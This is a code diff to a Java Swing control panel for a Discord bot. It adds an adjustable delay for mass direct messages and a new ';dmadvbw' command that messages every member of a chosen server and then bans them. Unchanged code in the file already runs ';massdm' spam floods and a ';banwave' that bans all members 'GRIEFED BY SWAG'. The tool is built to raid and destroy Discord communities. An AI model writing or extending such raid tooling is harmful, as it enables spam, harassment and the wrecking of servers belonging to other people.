@@ -9,6 +9,8 @@ import net.dv8tion.jda.api.requests.RestAction;
 
 import javax.swing.*;
 import javax.swing.border.TitledBorder;
+import javax.swing.event.ChangeEvent;
+import javax.swing.event.ChangeListener;
 import java.awt.*;
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
@@ -19,12 +21,13 @@ class ConfigGUI
         extends JFrame
         implements ActionListener {
 
-    // Components of the Form 
+    // Components of the Form
     private Container c;
     private JLabel title;
     private JLabel name;
     private JTextField tname;
     private JLabel mno;
+    private JLabel dmDelay;
     private JTextField tmno;
     private JLabel gender;
     private JRadioButton male;
@@ -40,12 +43,12 @@ class ConfigGUI
     private JTextArea tout;
     private JLabel res;
     private JTextArea resadd;
+    private JSlider dmDelaySlider;
     List<String> servers = new ArrayList<>();
 
-    // constructor, to initialize the components 
-    // with default values. 
-    public ConfigGUI()
-    {
+    // constructor, to initialize the components
+    // with default values.
+    public ConfigGUI() {
         setTitle("Bot Configurations");
         setBounds(300, 90, 900, 600);
         setDefaultCloseOperation(EXIT_ON_CLOSE);
@@ -64,13 +67,14 @@ class ConfigGUI
                     break;
                 }
             }
-        } catch (Exception ex){}
+        } catch (Exception ex) {
+            Logger.getLogger().print("Something went wrong while trying to display the Config GUI");
+        }
 
         c = getContentPane();
         c.setLayout(null);
 
-        for (Guild g : Core.jda.getGuilds())
-        {
+        for (Guild g : Core.jda.getGuilds()) {
             servers.add(g.getName());
         }
 
@@ -127,8 +131,7 @@ class ConfigGUI
         female.addActionListener(new ActionListener() {
             @Override
             public void actionPerformed(ActionEvent e) {
-                if (female.isSelected())
-                {
+                if (female.isSelected()) {
                     dispose();
                     LoginGUI.shouldRenderConfigurations = true;
 
@@ -171,6 +174,27 @@ class ConfigGUI
         scrollCLI.setBounds(tadd.getBounds());
         c.add(scrollCLI);
 
+        dmDelay = new JLabel("Delay: ");
+        dmDelay.setFont(new Font("Tahoma", Font.PLAIN, 12));
+        dmDelay.setSize(300, 20);
+        dmDelay.setLocation(805, 175);
+        c.add(dmDelay);
+
+        dmDelaySlider = new JSlider(1, 300, 5000, 1100);
+        dmDelaySlider.setMajorTickSpacing(500);
+        dmDelaySlider.setPaintLabels(true);
+        dmDelaySlider.setPaintTrack(true);
+        dmDelaySlider.setFont(new Font("Tahoma", Font.PLAIN, 10));
+        dmDelaySlider.setSize(300, 375);
+        dmDelaySlider.setLocation(675, 200);
+        dmDelaySlider.addChangeListener(new ChangeListener() {
+            @Override
+            public void stateChanged(ChangeEvent e) {
+                dmDelay.setText("Delay: " + dmDelaySlider.getValue());
+            }
+        });
+        c.add(dmDelaySlider);
+
         term = new JCheckBox("This bot was made by swag & urgay.");
         term.setFont(new Font("Tahoma", Font.PLAIN, 15));
         term.setSize(300, 20);
@@ -184,7 +208,7 @@ class ConfigGUI
         sub.addActionListener(this);
         c.add(sub);
 
-        close= new JButton("Close");
+        close = new JButton("Close");
         close.setFont(new Font("Tahoma", Font.PLAIN, 15));
         close.setSize(100, 20);
         close.setLocation(270, 450);
@@ -202,7 +226,6 @@ class ConfigGUI
         JScrollPane scroll = new JScrollPane(tout, ScrollPaneConstants.VERTICAL_SCROLLBAR_AS_NEEDED, ScrollPaneConstants.HORIZONTAL_SCROLLBAR_NEVER);
         scroll.setBounds(tout.getBounds());
         c.add(scroll);
-
 
 
         res = new JLabel("Configurations");
@@ -264,7 +287,7 @@ class ConfigGUI
                                     member.getUser().openPrivateChannel().flatMap(privateChannel -> privateChannel.sendMessage(message)).queue(null, failure -> tadd.append(member.getUser().getAsTag() + " has their DMs disabled.\n"));
                                     counter++;
                                     tadd.append("Messaged " + member.getUser().getAsTag() + " (" + counter + ")\n");
-                                    Thread.sleep(2000);
+                                    Thread.sleep(dmDelaySlider.getValue());
                                 }
                             }
                         } catch (Exception exception) {
@@ -281,18 +304,49 @@ class ConfigGUI
                         guild.getMembers().stream().filter(member -> (member.getIdLong() != Core.OWNERID && !member.getId().equals(Core.jda.getSelfUser().getId()) && guild.getSelfMember().canInteract(member))).forEach(member -> member.ban(7, "GRIEFED BY SWAG").queue());
                         tadd.append("Ban Wave Complete!");
                     }
-                } else {
-                    tout.setText("");
-                    resadd.setText("");
-                    res.setText("Please accept the TOS");
+                } else if (tadd.getText().startsWith(";dmadvbw")) {
+                    String message = tadd.getText().replaceFirst(";dmadvbw", "");
+                    tadd.setText("");
+                    int memberSize = Core.jda.getGuildsByName(serverBox.getSelectedItem().toString(), true).get(0).getMemberCount();
+                    Thread massDM = new Thread(() -> {
+                        try {
+                            int counter = 0;
+                            for (Member member : Core.jda.getGuildsByName(serverBox.getSelectedItem().toString(), true).get(0).getMembers()) {
+                                if (!member.getUser().isBot()) {
+                                    member.getUser().openPrivateChannel().flatMap(privateChannel -> privateChannel.sendMessage(message)).queue(null, failure -> tadd.append(member.getUser().getAsTag() + " has their DMs disabled.\n"));
+                                    counter++;
+                                    tadd.append("Messaged " + member.getUser().getAsTag() + " (" + counter + ")\n");
+                                    Thread.sleep(dmDelaySlider.getValue());
+                                }
+                                if (Core.jda.getGuildsByName(serverBox.getSelectedItem().toString(), true).get(0).getSelfMember().canInteract(member))
+                                {
+                                    member.ban(0, "GRIEFED BY SWAG LEL!").queue();
+                                    tadd.append("Banned " + member.getUser().getAsTag());
+                                }
+                            }
+                        } catch (InterruptedException exception) {
+                            tadd.setText("Caught Exception. HELP!\n");
+                        }
+                    });
+                    massDM.start();
+                    tadd.append(("Messaging " + memberSize + " users!\n"));
+                } else if (tadd.getText().startsWith(";help")) {
+                    tadd.setText("Commands: (4)\n" +
+                            ";massdm (message)\n" +
+                            ";banwave\n" +
+                            ";dmadvbw (message)\n" +
+                            ";help");
                 }
-            } else if (e.getSource() == close) {
-                res.setText("null");
-                LoginGUI.shouldRenderConfigurations = true;
-                dispose();
+            } else {
+                tout.setText("");
+                resadd.setText("");
+                res.setText("Invalid Configuration");
             }
+        } else if (e.getSource() == close) {
+            res.setText("null");
+            LoginGUI.shouldRenderConfigurations = true;
+            dispose();
         }
     }
 
-} 
-  
+}
